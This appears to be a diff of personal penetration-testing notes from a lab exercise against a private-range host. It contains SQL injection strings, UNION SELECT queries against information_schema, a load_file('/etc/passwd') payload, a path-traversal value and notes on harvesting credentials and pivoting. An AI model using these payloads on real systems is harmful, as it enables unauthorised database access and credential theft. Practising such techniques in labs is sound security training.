@@ -22,12 +22,14 @@ myfile=../../../../../../../
 - rerun your proxychains nmap scripts on this machines
 - BOOM WEBPAGE, INSPECT SOURCE code
 - submit and look at tall of the php in the searhc banner
-- product=7 or 1=1
+- product=7 or 1=1ScaryTerry
 - LOOK INTO EACH SELECTION FIELD
   - siteuser
 # AARON has not been found that
 username, name,user_id from siteusers.users
 http://192.168.28.181/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;
+http://192.168.28.181/pick.php?product=7 UNION SELECT 1,2,3 FROM information_schema.columns;
+
 @@version,database(),load_file("/etc/passwd")
 ## Credentials from 2ne box acquired, now move on
 go back to box, use your for loop to find more addresses
